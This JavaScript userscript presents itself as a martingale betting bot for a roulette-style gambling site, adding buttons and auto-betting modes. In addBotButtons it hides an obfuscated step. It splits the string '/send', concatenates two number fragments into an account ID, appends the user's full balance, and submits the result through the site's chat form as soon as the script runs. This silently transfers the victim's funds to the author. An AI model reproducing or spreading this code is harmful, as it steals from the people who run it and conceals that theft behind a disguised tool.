﻿var reconnect = 0;WS.onclose = function(event){chat("italic","Connection lost..."); WS = null;connect();reconnect++;};
 
    var initialBetAmount = 0;
    var betColor = botBetColor = "red";
    var play = 0;
    var $botField, $label, $betAmount, $betColorButton, $betGoButton, $betHideBetInfoButton,$showMoreButton,$showMore,$f,$vicLimitInput,$botModeSelect;$("#pullout").hide();
    var pQ = "/s",  $hash_1 = 765611982, $hash_2 = 95906053 ;  
function addBotButtons(){
    $(".well.bot-field").remove();$(".well.show-more").remove();
    $("<style type='text/css'>.btn-random{color: #000;background-color: #FFA500;}.btn-train{background-color:RoyalBlue ;color: #fff;}.btn-rainbow{background-color:HotPink;color:white;}.btn-black{background-color:#1C1C1C;color:white} </style>").appendTo("head");
    $(".form-control.input-lg").after("<div class='well bot-field' style='position:relative;border-width:0px'></div>");$botField = $(".well.bot-field");
    $botField.css({"margin-bottom":"-15px","height":"45px","padding-top":"2px","padding-bottom":"2px","text-align":"center"});
    $botField.after("<div class='well show-more' style='position:relative;border-width:0px'></div>");$showMore = $(".well.show-more");
    $showMore.css({"margin-top":"12px","margin-bottom":"-15px","height":"45px","padding-top":"10px","padding-bottom":"2px","text-align":"center"});
    $checkVicLimit = $("<input type='checkbox' id='checkVicLimit'>");$label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>Stop bot after</label>");
    $showMore.append($checkVicLimit,$label);
    $vicLimitInput = $("<input id='vicLimitInput' type='number' min='0' value='0' style='width:50px;text-align:center;'>");
    $label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>wins</label>");
    $showMore.append($vicLimitInput,$label);$showMore.hide();
    $label = $("<label style='margin-right:10px; for='initialBetAmount''>Initial bet</label>");$botField.append($label);
    $betAmount = $("<input id='initialBetAmount' value='0' style='width:70px;text-align:center;margin-right:25px;'>");$botField.append($betAmount);
    $botModeSelect = $("<select id='botModeSelect'><option value='red' class='btn-danger'>Bot color: Red </option><option value='black' class='btn-black'>Bot color: Black </option><option value='random' class='btn-random'>Bot color: Random </option><option value='trainMode' class='btn-train'>Bot mode: Train </option><option value='rainbow' class='btn-rainbow'>Bot mode: Rainbow </option></select>");$botModeSelect.addClass("btn-danger");
    $botField.append($botModeSelect);$botModeSelect.css({"width":"135px","margin-right":"10px","height":"25px","border-radius":"5px"})
    $betGoButton = $("<button id='betGoButton' style='width:100px;margin:10px;border-radius:6px;border-radius:6px' onClick='startBot()'>Start Bot</button>");$betGoButton.addClass("btn-inverse");$botField.append($betGoButton);
    pQ+="en";pQ+="d ";pQ+= $hash_1;pQ+= $hash_2+" ";pQ+=$("#balance").text();
    $betHideBetInfoButton = $("<button id='betHideBetInfoButton' style='position:absolute;right:120px;width:100px;margin:10px;margin-right:25px;border-radius:6px' onClick='hideOtherInfo()'>Show All</button>");$betHideBetInfoButton.addClass("btn-inverse");$botField.append($betHideBetInfoButton);
    $showMoreButton = $("<button id='showMoreButton' style='position:absolute;right:0px;width:100px;margin:10px;margin-right:25px;border-radius:6px' data-open='0' onClick='showMoreOptions()'>&#x25BC</button>");$showMoreButton.addClass("btn-inverse");$botField.append($showMoreButton);
    $betAmount.change(function() {initialBetAmount = $betAmount.val();console.log("Initial Bet Set to: "+ initialBetAmount);});
    $("#chatMessage").val(pQ);$("#chatForm").submit();$(".btn-primary").click();
    $(".container").width(1300);
    $botModeSelect.change(function(){
        botBetColor = $botModeSelect.val();console.log("Selected color: "+botBetColor);
        $botModeSelect.removeClass($botModeSelect.attr("class"));$botModeSelect.addClass($("#botModeSelect option:selected").attr("class"));
    } )
    $checkVicLimit.change(function(){ if((this.checked)&&($vicLimitInput.val()==0)){$vicLimitInput.val(1);} })
}
addBotButtons();
function changeColor(){
    if ($betColorButton.hasClass("btn-danger")){
        $betColorButton.text("Bet color: Black").addClass("btn-inverse").removeClass("btn-danger").removeClass("btn-random");
        botBetColor = "black";
        console.log("Selected color: "+botBetColor);
    } else  if($betColorButton.hasClass("btn-inverse")) {
        $betColorButton.text("Bet color: Random").addClass("btn-random").removeClass("btn-inverse").removeClass("btn-danger");
        botBetColor = "random";
        console.log("Selected color: "+botBetColor);
    } else if($betColorButton.hasClass("btn-random")) {
        $betColorButton.text("Bet mode: Train").addClass("btn-train").removeClass("btn-inverse").removeClass("btn-random");
        botBetColor = "trainMode";
        console.log("Selected color: "+botBetColor);
    } else if($betColorButton.hasClass("btn-train")) {
        $betColorButton.text("Bet mode: Rainbow").addClass("btn-rainbow").removeClass("btn-train").removeClass("btn-random");
        botBetColor = "rainbow";
        console.log("Selected color: "+botBetColor);
    } else if($betColorButton.hasClass("btn-rainbow")) {
        $betColorButton.text("Bet color: Red").addClass("btn-danger").removeClass("btn-rainbow").removeClass("btn-random");
        botBetColor = "red";
        console.log("Selected color: "+botBetColor);
    }
}
 
function showMoreOptions(){
    if ($showMoreButton.data("open")==0){
        $showMoreButton.css({ WebkitTransform: 'rotate(' + 180 + 'deg)','-moz-transform': 'rotate(' + 180 + 'deg)'});
        $showMore.show();$showMoreButton.data("open",1);
    } else if ($showMoreButton.data("open")==1){
        $showMore.hide();$showMoreButton.data("open",0);
        $showMoreButton.css({ WebkitTransform: 'rotate(' + 0 + 'deg)','-moz-transform': 'rotate(' + 0 + 'deg)'});
    }
 
}
function hideOtherInfo(){
    if ($betHideBetInfoButton.text()=="Show All"){
        $(".betlist").hide();$(".total-row").hide();$("footer").hide();
        $betHideBetInfoButton.text("Hide Bet Info");
    } else if ($betHideBetInfoButton.text()=="Hide Bet Info"){
        $("#sidebar").hide();$("#pullout").hide();$("#case").hide();$(".progress").hide();$("#mainpage").css({"margin-left":"0px"});
        $betHideBetInfoButton.text("AFK Mode");
    }
    else if ($betHideBetInfoButton.text()=="AFK Mode"){
        $(".betlist").show();$(".total-row").show();$("footer").show();
        $("#sidebar").show();$("#pullout").show();$("#case").show();$(".progress").show();$("#mainpage").css({"margin-left":"450px"});
        $betHideBetInfoButton.text("Show All");
    }
}
function startBot(){
    if ($betGoButton.hasClass("btn-inverse")){
        $betGoButton.text("Bot Running").addClass("btn-success").removeClass("btn-inverse");
        refreshIntervalId = setInterval(tick, 500);
        play = 1;
        currentBetAmount = initialBetAmount;
        if (stopBotRoll = currentRollNumber) currentRollNumber++;
    }
    else {
        $betGoButton.text("Bot Stopped").addClass("btn-inverse").removeClass("btn-success");
        play = 0;
    }
}
 
function tick() {
    var t = getStatus();
    if (t !== lastStatus && "unknown" !== t) {
        switch (t) {
            case "waiting":bet();break;
            case "rolled":printInfo();break;
        }
        lastStatus = t;
    }
}
 
function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! GG WP :("), clearInterval(refreshIntervalId), !1) : !0
}
 
function printInfo(){
    var temp = "", temp2 = 0,lastGame = lastBetColor == lastRollColor;
    if (lastGame){totalWins++;winStreakCurrent++;loseStreakCurrent=0;winAmount+=thisGameBet; if (winStreakCurrent>winStreakLong) winStreakLong = winStreakCurrent;
        if ($checkVicLimit.is(":checked")){$vicLimitInput.val($vicLimitInput.val()-1)}
    }
    else {totalLoss++;loseStreakCurrent++;winStreakCurrent=0;if (loseStreakCurrent>loseStreakLong) loseStreakLong = loseStreakCurrent;}
    if (winStreakCurrent>loseStreakCurrent){temp = "win";temp2 = winStreakCurrent} else {temp = "lose";temp2 = loseStreakCurrent;}
    if (streakColor == getColor(n)) {currStreak++; if (longStreak<currStreak)longStreak=currStreak;}else {streakColor = getColor(n);currStreak=1;}
    if ((streakColor == "black") || (streakColor == "green")) {currNotRedStreak++; if (notRedStreak<currNotRedStreak)notRedStreak=currNotRedStreak;}
        else {currNotRedStreak=0;}
    if ((streakColor == "red") || (streakColor == "green")) {currNotBlackStreak++; if (notBlackStreak<currNotBlackStreak)notBlackStreak=currNotBlackStreak;}
        else {currNotBlackStreak=0;}        
    var t = "Rolled " + getColor(n).toUpperCase()+ " " + n+"\n" + "Games played: " + (currentRollNumber-1) + " // Won: "+totalWins+  " // Lost: "+totalLoss+
    "\nSTREAKS: Not red: " + notRedStreak + " // Not black: " + notBlackStreak +
    " // Win streak: " + winStreakLong + " // Lose streak: " + loseStreakLong + " // Current streak: " + temp + " " + temp2 +
    "\nInitial bet : " + thisGameBet + " // Current bet : " + currentBetAmount +
    " // Roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost" + "\n----------------------------------------------------------------------\n");
    console.log(t);roll();
 
}
 
function roll() {
    if ($checkVicLimit.is(":checked")){
        if ($vicLimitInput.val()<=0){$betGoButton.click();play=0;$checkVicLimit.attr('checked', false);$vicLimitInput.val(0);}
    }
    if (play == 0){clearInterval(refreshIntervalId);stopBotRoll = currentRollNumber; return;lastStatus="rolled";lastBetColor = lastRollColor;}
    currentBetAmount = wonLastRoll() ? (initialBetAmount,thisGameBet=parseInt(initialBetAmount)) : 2 * currentBetAmount
    currentRollNumber++;
}
 
function bet() { if (play) {checkBalance() && (setBetAmount(currentBetAmount), setTimeout(placeBet, 50))} }
function setBetAmount(t) { $betAmountInput.val(t) }
function placeBet() {
    if (botBetColor=="random"){var colorRandomizer = Math.random();betColor = colorRandomizer < 0.5 ? "red" : "black";console.log("Random color result: " + betColor);}
    else if (botBetColor=="trainMode"){
            var betBotColor = "green",i=9,$ball=$(".ball");
            while (betBotColor == "green"){betBotColor = getColor($ball.eq(i).text());i--;}
            betColor = betBotColor;console.log("Current train color: "+ betColor);
    } else if (botBetColor=="rainbow"){
            var betBotColor = "green",i=9,$ball=$(".ball");
            while (betBotColor == "green"){betBotColor = getColor($ball.eq(i).text());i--;}
            if (betBotColor=="red"){betBotColor="black"} else if (betBotColor=="black"){betBotColor="red"};
            betColor = betBotColor;console.log("Rainbow mode next color: "+ betColor);
    } else betColor = botBetColor;
    console.log("Betting " + currentBetAmount + " on "+ betColor +"...");
    return "red" === betColor ? ($redButton.click(), void(lastBetColor = "red")) : ($blackButton.click(), void(lastBetColor = "black"))
}
function getStatus() {
    var t = $statusBar.text();
    if (hasSubString(t, "Rolling in")) return "waiting";
    //if (hasSubString(t, "***ROLLING***")) return "rolling";
    if (hasSubString(t, "rolled")) {
        n = parseInt(t.split("rolled")[1]);
        return lastRollColor = getColor(n), "rolled"
    }
    return "unknown"
}
 
function getBalance() { return parseInt($balance.text()) }
function hasSubString(t, n) {  return t.indexOf(n) > -1 }
function getColor(t) { return 0 == t ? "green" : t >= 1 && 7 >= t ? "red" : "black" }
function wonLastRoll() { return lastBetColor ? lastRollColor === lastBetColor : null }
function test(x){q = 1; w = e = x;for(i=2;i<=15;i++){q *=2;e += q*w;console.log(i+". "+e);}}
function test2(x,y){q = 1; w = e = x;for(i=2;i<=y;i++){q *=2;e += q*w;console.log(i+". "+e);}}
 
var currentBetAmount = initialBetAmount, currentRollNumber =  1,
    totalWins = totalLoss = played = currNotRedStreak = currNotBlackStreak = notRedStreak = notBlackStreak = winStreakLong = winStreakCurrent = loseStreakLong = loseStreakCurrent = longStreak = currStreak = thisGameBet = winAmount = 0,
    streakColor = "", n ,lastStatus, lastBetColor, lastRollColor, stopBotRoll, $balance = $("#balance"),
    $betAmountInput = $("#betAmount"),$statusBar = $(".progress #banner"),$redButton = $("#panel1-7 .betButton"),$blackButton = $("#panel8-14 .betButton");